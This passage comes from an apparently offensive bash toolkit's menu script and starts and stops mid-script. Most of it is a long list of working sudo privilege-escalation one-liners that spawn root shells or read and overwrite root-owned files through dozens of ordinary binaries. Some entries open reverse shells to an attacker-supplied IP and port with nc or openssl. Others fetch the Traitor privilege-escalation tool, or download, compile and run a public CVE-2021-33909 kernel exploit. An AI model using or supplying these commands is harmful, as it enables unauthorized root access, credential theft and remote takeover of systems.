		if [[ "$BFL" != "" ]];
		then
			Scarica "andrew-d/static-binaries/linux/arm/""$BFL" "$ENTSSL""andrew-d/static-binaries/raw/master/binaries/linux/arm/""$BFL" "$BFL"
		fi
	;;
	"224")
		Scarica "swisskyrepo/PayloadsAllTheThings/Methodology_and_Resources/Linux-PrivilegeEscalation" "$ENTRAW""swisskyrepo/PayloadsAllTheThings/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md" "Linux-PrivilegeEscalation.md"
	;;
	"225")
		export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
	;;
	"226")
		if [[ -f ./traitor-386 ]];
		then
			traitor-386 -a -p
		else
			URT="liamg/traitor/releases"
			URD="$URT""/download"
			select CHC in $(curl -s -k -L "$ENTSSL""$URT"|grep "href"|grep "$URD"|grep "traitor-386"|awk -F \" '{print $2}')
			do
				Scarica "liamg/traitor-386" "$ENTSSL""liamg/traitor/releases/download/v0.0.2/traitor-386" "traitor-386"
				break
			done
		fi
	;;
	"227")
		if [[ -f ./traitor-arm64 ]];
		then
			traitor-arm64 -a -p
		else
			URT="liamg/traitor/releases"
			URD="$URT""/download"
			select CHC in $(curl -s -k -L "$ENTSSL""$URT"|grep "href"|grep "$URD"|grep "traitor-arm64"|awk -F \" '{print $2}')
			do
				Scarica "liamg/traitor-arm64" "$ENTSSL""liamg/traitor/releases/download/v0.0.2/traitor-arm64" "traitor-arm64"
				break
			done
		fi
	;;
	"228")
		if [[ -f ./traitor-amd64 ]];
		then
			traitor-amd64 -a -p
		else
			URT="liamg/traitor/releases"
			URD="$URT""/download"
			select CHC in $(curl -s -k -L "$ENTSSL""$URT"|grep "href"|grep "$URD"|grep "traitor-amd64"|awk -F \" '{print $2}')
			do
				Scarica "liamg/traitor-amd64" "$ENTSSL""liamg/traitor/releases/download/v0.0.2/traitor-amd64" "traitor-amd64"
				break
			done
		fi
	;;
	"229")
		export PATH=$(pwd):$PATH
	;;
	"230")
		if [[ -f ./yodo.sh ]];
		then
			./yodo.sh
		else
			Scarica "b3rito/yodo" "$ENTRAW""b3rito/yodo/master/yodo.sh" "yodo.sh"
		fi
	;;
	"231")
		Scarica "smaranchand/bucky" "$ENTSSL""smaranchand/bucky/archive/refs/heads/master.zip" "bucky.zip"
	;;
	"232")
		URT="BSI-Bund/RdpCacheStitcher/releases"
		URD="$URT""/download"
		select CHC in $(curl -s -k -L "$ENTSSL""$URT"|grep "href"|grep "$URD"|grep "linux64"|awk -F \" '{print $2}')
		do
			Scarica "BSI-Bund/RdpCacheStitcher-linux64" "$ENTSSL""$CHC" "RdpCacheStitcher-linux64"
			break
		done
	;;
	"233")
		Scarica "hashtopolis/agent-python" "$ENTSSL""hashtopolis/agent-python/archive/refs/heads/master.zip" "agent-python.zip"
	;;
	"234")
		Scarica "Liang2580/CVE-2021-33909" "$ENTRAW""Liang2580/CVE-2021-33909/main/exploit.c" "sequoia.c"
		gcc sequoia.c -o sequoia;chmod +x sequoia;mkdir dir;./sequoia $(pwd)/dir
	;;
	"235")
		URT="armosec/kubescape/releases"
		URD="$URT""/download"
		select CHC in $(curl -s -k -L "$ENTSSL""$URT"|grep "href"|grep "$URD"|grep "kubescape"|awk -F \" '{print $2}')
		do
			Scarica "armosec/kubescape" "$ENTSSL""$CHC" "kubescape"
			break
		done
	;;
	"236")
		TF=$(mktemp)
		echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
		sudo ansible-playbook $TF
	;;
	"237")
		echo "Trying method 1"
		sudo apt-get changelog apt
		!/bin/sh
		echo "Trying method 2"
		TF=$(mktemp)
		echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' > $TF
		sudo apt install -c $TF sl
		echo "Trying method 3"
		sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh
	;;
	"238")
		echo "Digit a root's file to read"
		read -e -p "(example, root.txt): " LFILE
		if [[ -f "$LFILE" ]];
		then
			TF=$(mktemp -u)
			sudo ar r "$TF" "$LFILE"
			cat "$TF"
		fi
	;;
	"239")
		echo "Digit a command"
		read -p "(example, /bin/bash): " COMMAND
		if [[ "$COMMAND" != "" ]];
		then
			if [[ "$TIP" != "" ]];
			then
				echo "Digit a target IP"
				read -p "(example, http://127.0.0.1): " TIP
			fi
			TF=$(mktemp)
			echo "$COMMAND" > $TF
			chmod +x $TF
			sudo aria2c --on-download-error=$TF "$TIP"
		fi
	;;
	"240")
		echo "Digit a file to write"
		read -p "(example, IdontKnow.txt): " LFILE
		TF=$(mktemp -d)
		echo "Digit the path where to write"
		read -p "(example, /AnyWhere/): " LDIR
		echo DATA >"$TF/$LFILE"
		arj a "$TF/a" "$TF/$LFILE"
		sudo arj e "$TF/a" $LDIR
	;;
	"241")
		sudo ash
	;;
	"242")
		echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | sudo at now; tail -f /dev/null
	;;
	"243")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo atobm $LFILE 2>&1 | awk -F "'" '{printf "%s", $2}'
		fi
	;;
	"244")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo base32 "$LFILE" | base32 --decode
		fi
	;;
	"245")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo basenc --base64 $LFILE | basenc -d --base64
		fi
	;;
	"246")
		sudo bpftrace -c /bin/sh -e 'END {exit()}'
	;;
	"247")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo bridge -b "$LFILE"
		fi
	;;
	"248")
		echo "!/bin/sh"
		sudo bundler help
		!/bin/sh
	;;
	"249")
		echo "!/bin/sh"
		sudo busctl --show-machine
		!/bin/sh
	;;
	"250")
		sudo busybox sh
	;;
	"251")
		sudo install -m =xs $(which byebug) .
		TF=$(mktemp)
		echo 'system("/bin/sh")' > $TF
		./byebug $TF
		continue
	;;
	"252")
		sudo c89 -wrapper /bin/sh,-s .
	;;
	"253")
		sudo c99 -wrapper /bin/sh,-s .
	;;
	"254")
		sudo capsh --
	;;
	"255")
		TF=$(mktemp -d)
		sudo certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'
	;;
	"256")
		sudo check_by_ssh -o "ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)" -H localhost -C xx
	;;
	"257")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo check_cups --extra-opts=@$LFILE
		fi
	;;
	"258")
		echo "Digit a file to write"
		read -p "(example, IdontKnow.txt)" LFILE
		if [[ "$LFILE" != "" ]];
		then
			echo "Digit an input to write"
			read -p "(example, IdontKnow)" INPUT
			if [[ "$INPUT" != "" ]];
			then
				sudo check_log -F $INPUT -O $LFILE
			fi
		fi
	;;
	"259")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo check_memory --extra-opts=@$LFILE
		fi
	;;
	"260")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo check_raid --extra-opts=@$LFILE
		fi
	;;
	"261")
		echo "Digit a command"
		read -p "(/bin/bash): " COMMAND
		if [[ "$COMMAND" != "" ]];
		then
			OUTPUT=output_file
			TF=$(mktemp)
			echo "$COMMAND | tee $OUTPUT" > $TF
			chmod +x $TF
			umask 022
			check_ssl_cert --curl-bin $TF -H example.net
			cat $OUTPUT
		fi
	;;
	"262")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo check_statusfile $LFILE
		fi
	;;
	"263")
		echo "Digit a root's file to set readable"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo chmod 6777 $LFILE
		fi
	;;
	"264")
		echo "Digit a root's file to set readable"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo chown $(id -un):$(id -gn) $LFILE
		fi
	;;
	"265")
		sudo chroot /
	;;
	"266")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo cmp $LFILE /dev/zero -b -l
		fi
	;;
	"267")
		TF=$(mktemp -d)
		echo 'CALL "SYSTEM" USING "/bin/sh".' > $TF/x
		sudo cobc -xFj --frelax-syntax-checks $TF/x
	;;
	"268")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo column $LFILE
		fi
	;;
	"269")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo cmm $LFILE /dev/null 2>/dev/null
		fi
	;;
	"270")
		TF=$(mktemp -d)
		echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
		sudo composer --working-dir=$TF run-script x
	;;
	"271")
		TF=$(mktemp)
		echo 'exec "/bin/sh";' >$TF
		sudo cowsay -f $TF x
	;;
	"272")
		TF=$(mktemp)
		echo 'exec "/bin/sh";' >$TF
		sudo cowthink -f $TF x
	;;
	"273")
		sudo cp /bin/sh /bin/cp && sudo cp
	;;
	"274")
		echo "! exec '/bin/bash'"
		sudo cpan
		! exec '/bin/bash'
	;;
	"275")
		echo '/bin/sh </dev/tty >/dev/tty' >localhost
		sudo cpio -o --rsh-command /bin/sh -F localhost:
	;;
	"276")
		sudo cpulimit -l 100 -f /bin/sh
	;;
	"277")
		echo "!sh"
		sudo crash -h
		!sh
	;;
	"278")
		sudo crontab -e
	;;
	"279")
		sudo csh
	;;
	"280")
		sync; echo 3 > /proc/sys/vm/drop_caches
		swapoff -a && swapon -a
	;;
	"281")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			csplit $LFILE 1
			cat xx01
		fi
	;;
	"282")
		sudo csvtool call '/bin/sh;false' /etc/passwd
	;;
	"283")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo cupsfilter -i application/octet-stream -m application/octet-stream $LFILE
		fi
	;;
	"284")
		echo "Digit a root's file to download"
		read -p "(example, http://127.0.0.1/root.txt)" URL
		if [[ "$URL" != "" ]];
		then
			echo "Digit a root's file to write the downloaded file"
			read -p "(example, root.txt)" LFILE
			if [[ -f "$LFILE" ]];
			then
				sudo curl $URL -o $LFILE
			fi
		fi
	;;
	"285")
		sudo dash
	;;
	"286")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo date -f $LFILE
		fi
	;;
	"287")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo dialog --textbox "$LFILE" 0 0
		fi
	;;
	"288")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo dig -f $LFILE
		fi
	;;
	"289")
		echo "!/bin/sh"
		sudo dmesg -H
		!/bin/sh
	;;
	"290")
		echo "sudo dmsetup create base <<EOF"
		echo "0 3534848 linear /dev/loop0 94208"
		echo "EOF"
		echo "sudo dmsetup ls --exec '/bin/sh -s'"
		sudo dmsetup ls --exec '/bin/sh -s'
	;;
	"291")
		sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
	;;
	"292")
		TF=$(mktemp -d)
		echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
		sudo easy_install $TF
	;;
	"293")
		echo "!/bin/sh"
		sudo eb logs
		!/bin/sh
	;;
	"294")
		echo "!/bin/sh"
		sudo ed
		!/bin/sh
	;;
	"295")
		sudo emacs -Q -nw --eval '(term "/bin/sh")'
	;;
	"296")
		sudo env /bin/sh
	;;
	"297")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo eqn "$LFILE"
		fi
	;;
	"298")
		echo "!/bin/sh"
		sudo ex
		!/bin/sh
	;;
	"299")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo expand "$LFILE"
		fi
	;;
	"300")
		sudo expect -c 'spawn /bin/sh;interact'
	;;
	"301")
		TF=$(mktemp -d)
		echo 'exec("/bin/sh")' > $TF/x.rb
		sudo FACTERLIB=$TF facter
	;;
	"302")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo file -f $LFILE
		fi
	;;
	"303")
		sudo find . -exec /bin/sh \; -quit
	;;
	"304")
		sudo flock -u / /bin/sh
	;;
	"305")
		echo "Digit a root's file to make readable"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo fmt -999 "$LFILE"
		fi
	;;
	"306")
		echo "Digit a root's file to make readable"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo fold -w99999999 "$LFILE"
		fi
	;;
	"307")
		echo "!/bin/sh"
		sudo ftp
		!/bin/sh
	;;
	"308")
		sudo gawk 'BEGIN {system("/bin/sh")}'
	;;
	"309")
		sudo gcc -wrapper /bin/sh,-s .
	;;
	"310")
		sudo gdb -nx -ex '!sh' -ex quit
	;;
	"311")
		sudo gem open -e "/bin/sh -c /bin/sh" rdoc
	;;
	"312")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo genisoimage -q -o - "$LFILE"
		fi
	;;
	"313")
		sudo ghc -e 'System.Process.callCommand "/bin/sh"'
	;;
	"314")
		echo "System.Process.callCommand \"/bin/sh\""
		sudo ghci
		System.Process.callCommand "/bin/sh"
	;;
	"315")
		sudo gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system("sh")'
	;;
	"316")
		echo "!/bin/sh"
		sudo git -p help config
		!/bin/sh
	;;
	"317")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo grep '' $LFILE
		fi
	;;
	"318")
		TF=$(mktemp)
		echo '#!/bin/sh' > $TF
		echo 'exec /bin/sh 0<&1' >> $TF
		chmod +x $TF
		sudo gtester -q $TF
	;;
	"319")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo gzip -f $LFILE -t
		fi
	;;
	"320")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo hd "$LFILE"
		fi
	;;
	"321")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo head -c1G "$LFILE"
		fi
	;;
	"322")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo hexdump -C "$LFILE"
		fi
	;;
	"323")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo highlight --no-doc --failsafe "$LFILE"
		fi
	;;
	"324")
		echo "/bin/sh"
		sudo hping3
		/bin/sh
	;;
	"325")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo iconv -f 8859_1 -t 8859_1 "$LFILE"
		fi
	;;
	"326")
		echo "!/bin/sh"
		sudo iftop
		!/bin/sh
	;;
	"327")
		echo "Digit a root's file to make readable"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			TF=$(mktemp)
			sudo install -m 6777 $LFILE $TF
		fi
	;;
	"328")
		sudo ionice /bin/sh
	;;
	"329")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo ip -force -batch "$LFILE"
		fi
	;;
	"330")
		echo "exec '/bin/bash'"
		sudo irb
		exec '/bin/bash'
	;;
	"331")
		echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()" | sudo jjs
	;;
	"332")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo join -a 2 /dev/null $LFILE
		fi
	;;
	"333")
		echo "!/bin/sh"
		sudo journalctl
		!/bin/sh
	;;
	"334")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo jq -Rr . "$LFILE"
		fi
	;;
	"335")
		sudo jrunscript -e "exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')"
	;;
	"336")
		sudo knife exec -E 'exec "/bin/sh"'
	;;
	"337")
		sudo ksh
	;;
	"338")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo ksshell -i $LFILE
		fi
	;;
	"339")
		sudo /lib/ld.so /bin/sh
	;;
	"340")
		TF=$(mktemp -d)
		echo "$TF" > "$TF/conf"
		sudo ldconfig -f "$TF/conf"
	;;
	"341")
		echo "!/bin/sh"
		sudo less /etc/profile
		!/bin/sh
	;;
	"342")
		sudo ln -fs /bin/sh /bin/ln
		sudo ln
	;;
	"343")
		echo "!/bin/sh"
		sudo loginctl user-status
		!/bin/sh
	;;
	"344")
		sudo logsave /dev/null /bin/sh -i
	;;
	"345")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo look '' "$LFILE"
		fi
	;;
	"346")
		sudo ltrace -b -L /bin/sh
	;;
	"347")
		sudo lua -e 'os.execute("/bin/sh")'
	;;
	"348")
		sudo lualatex -shell-escape '\documentclass{article}\begin{document}\directlua{os.execute("/bin/sh")}\end{document}'
	;;
	"349")
		sudo luatex -shell-escape '\directlua{os.execute("/bin/sh")}\end'
	;;
	"350")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo lwp-request "file://$LFILE"
		fi
	;;
	"351")
		sudo mail --exec='!/bin/sh'
	;;
	"352")
		COMMAND='/bin/sh'
		sudo make -s --eval=$'x:\n\t-'"$COMMAND"
	;;
	"353")
		echo "!/bin/sh"
		sudo man man
		!/bin/sh
	;;
	"354")
		sudo mawk 'BEGIN {system("/bin/sh")}'
	;;
	"355")
		echo "!/bin/sh"
		TERM= sudo more /etc/profile
		!/bin/sh
	;;
	"356")
		sudo mount -o bind /bin/sh /bin/mount
		sudo mount
	;;
	"357")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo msgattrib -P $LFILE
		fi
	;;
	"358")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo msgcat -P $LFILE
		fi
	;;
	"359")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo msgconv -P $LFILE
		fi
	;;
	"360")
		echo x | sudo msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'
	;;
	"361")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo msgmerge -P $LFILE /dev/null
		fi
	;;
	"362")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo msguniq -P $LFILE
		fi
	;;
	"363")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo mtr --raw -F "$LFILE"
		fi
	;;
	"364")
		sudo mysql -e '\! /bin/sh'
	;;
	"365")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo nasm -@ $LFILE
		fi
	;;
	"366")
		sudo nawk 'BEGIN {system("/bin/sh")}'
	;;
	"367")
		echo "Digit your IP"
		read -p "(example, 10.11.12.13) " RHOST
		if [[ "$RHOST" != "" ]];
		then
			echo "Digit your PORT"
			read -p "(example, 9001) " RPORT
			if [[ "$RPORT" != "" ]];
			then
				echo "nc -lvnp ""$RPORT"
				sudo nc -e /bin/sh $RHOST $RPORT
			fi
		fi
	;;
	"368")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo neofetch --ascii $LFILE
		fi
	;;
	"369")
		sudo nice /bin/sh
	;;
	"370")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo nl -bn -w1 -s '' $LFILE
		fi
	;;
	"371")
		TF=$(mktemp)
		echo 'os.execute("/bin/sh")' > $TF
		sudo nmap --script=$TF
	;;
	"372")
		sudo node -e 'child_process.spawn("/bin/sh", {stdio: [0, 1, 2]})'
	;;
	"373")
		sudo nohup /bin/sh -c "sh <$(tty) >$(tty) 2>$(tty)"
	;;
	"374")
		TF=$(mktemp -d)
		echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
		sudo npm -C $TF --unsafe-perm i
	;;
	"375")
		TF=$(mktemp -d)
		echo '#!/bin/sh' > $TF/groff
		echo '/bin/sh' >> $TF/groff
		chmod +x $TF/groff
		sudo GROFF_BIN_PATH=$TF nroff
	;;
	"376")
		sudo nsenter /bin/sh
	;;
	"378")
		sudo octave-cli --eval 'system("/bin/sh")'
	;;
	"379")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo od -An -c -w9999 "$LFILE"
		fi
	;;
	"380")
		echo "Digit your IP"
		read -p "(example, 10.11.12.13) " RHOST
		if [[ "$RHOST" != "" ]];
		then
			echo "Digit your PORT"
			read -p "(example, 9001) " RPORT
			if [[ "$RPORT" != "" ]];
			then
				mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s
			fi
		fi
	;;
	"381")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo openvpn --config "$LFILE"
		fi
	;;
	"382")
		echo "Digit a command"
		read -p "(example, /bin/bash) " COMMAND
		if [[ "$COMMAND" != "" ]];
		then
			TF=$(mktemp -u)
			sudo openvt -- sh -c "$COMMAND >$TF 2>&1"
			cat $TF
		fi
	;;
	"383")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo paste $LFILE
		fi
	;;
	"384")
		TF=$(mktemp)
		echo 'import os; os.system("/bin/sh")' > $TF
		sudo pdb $TF
		cont
	;;
	"385")
		sudo pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
	;;
	"386")
		sudo pdftex --shell-escape '\write18{/bin/sh}\end'
	;;
	"387")
		sudo perl -e 'exec "/bin/sh";'
	;;
	"388")
		echo "!/bin/sh"
		sudo pg /etc/profile
		!/bin/sh
	;;
	"389")
		echo "Digit a command"
		read -p "(example, /bin/bash) " CMD
		if [[ "$CMD" != "" ]];
		then
			sudo php -r "system('$CMD');"
		fi
	;;
	"390")
		TF=$(mktemp -d)
		echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
		sudo pip install $TF
	;;
	"391")
		sudo pkexec /bin/sh
	;;
	"392")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo pr -T $LFILE
		fi
	;;
	"393")
		echo "system(\"/bin/sh\")"
		sudo pry
	;;
	"394")
		echo "\\?"
		echo "!/bin/sh"
		sudo psql
	;;
	"395")
		sudo puppet apply -e "exec { '/bin/sh -c \"exec sh -i <$(tty) >$(tty) 2>$(tty)\"': }"
	;;
	"396")
		sudo python -c 'import os; os.system("/bin/sh")'
	;;
	"397")
		sudo rake -p '`/bin/sh 1>&0`'
	;;
	"398")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo readelf -a @$LFILE
		fi
	;;
	"399")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo redcarpet "$LFILE"
		fi
	;;
	"400")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo rev $LFILE | rev
		fi
	;;
	"401")
		sudo rlwrap /bin/sh
	;;
	"402")
		sudo rpm --eval '%{lua:os.execute("/bin/sh")}'
	;;
	"403")
		sudo rpmquery --eval '%{lua:posix.exec("/bin/sh")}'
	;;
	"404")
		sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
	;;
	"405")
		sudo ruby -e 'exec "/bin/sh"'
	;;
	"406")
		echo "!/bin/sh"
		sudo run-mailcap --action=view /etc/hosts
	;;
	"407")
		sudo run-parts --new-session --regex '^sh$' /bin
	;;
	"408")
		sudo rview -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
	;;
	"409")
		sudo rvim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
	;;
	"410")
		TF=$(mktemp)
		echo 'sh 0<&2 1>&2' > $TF
		chmod +x "$TF"
		sudo scp -S $TF x y:
	;;
	"411")
		sudo screen
	;;
	"412")
		sudo script -q /dev/null
	;;
	"413")
		sudo sed -n '1e exec sh 1>&0' /etc/hosts
	;;
	"414")
		sudo service ../../bin/sh
	;;
	"415")
		sudo setarch $(arch) /bin/sh
	;;
	"416")
		sudo sg root
	;;
	"417")
		sudo slsh -e 'system("/bin/sh")'
	;;
	"418")
		sudo socat stdin exec:/bin/sh
	;;
	"419")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo soelim "$LFILE"
		fi
	;;
	"420")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo sort -m "$LFILE"
		fi
	;;
	"421")
		sudo split --filter=/bin/sh /dev/stdin
	;;
	"422")
		sudo sqlite3 /dev/null '.shell /bin/sh'
	;;
	"423")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo ss -a -F $LFILE
		fi
	;;
	"424")
		sudo ssh-keygen -D ./lib.so
	;;
	"425")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo ssh-keyscan -f $LFILE
		fi
	;;
	"426")
		sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
	;;
	"427")
		sudo start-stop-daemon -n $RANDOM -S -x /bin/sh
	;;
	"428")
		sudo stdbuf -i0 /bin/sh
	;;
	"429")
		sudo strace -o /dev/null /bin/sh
	;;
	"430")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo strings "$LFILE"
		fi
	;;
	"431")
		sudo su
	;;
	"432")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo sysctl -n "/../../$LFILE"
		fi
	;;
	"433")
		echo "!sh"
		sudo systemctl
	;;
	"434")
		echo "!sh"
		sudo systemd-resolve --status
	;;
	"435")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo tac -s 'RANDOM' "$LFILE"
		fi
	;;
	"436")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo tail -c1G "$LFILE"
		fi
	;;
	"437")
		sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
	;;
	"438")
		sudo taskset 1 /bin/sh
	;;
	"439")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo tbl $LFILE
		fi
	;;
	"440")
		echo "exec /bin/sh <@stdin >@stdout 2>@stderr"
		sudo tclsh
	;;
	"441")
		echo "Digit a command"
		read -p "(example, /bin/bash) " COMMAND
		if [[ "$COMMAND" != "" ]];
		then
			TF=$(mktemp)
			echo "$COMMAND" > $TF
			chmod +x $TF
			sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
		fi
	;;
	"442")
		sudo tex --shell-escape '\write18{/bin/sh}\end'
	;;
	"443")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo tic -C "$LFILE"
		fi
	;;
	"444")
		sudo time /bin/sh
	;;
	"445")
		echo "!/bin/sh"
		sudo timedatectl list-timezones
	;;
	"446")
		sudo timeout --foreground 7d /bin/sh
	;;
	"447")
		sudo tmux
	;;
	"448")
		echo "Digit a root's file to read"
		read -p "(example, root.txt)" LFILE
		if [[ -f "$LFILE" ]];
		then
			sudo troff $LFILE
		fi
	;;
	"449")
		echo "Digit a root's file to read"
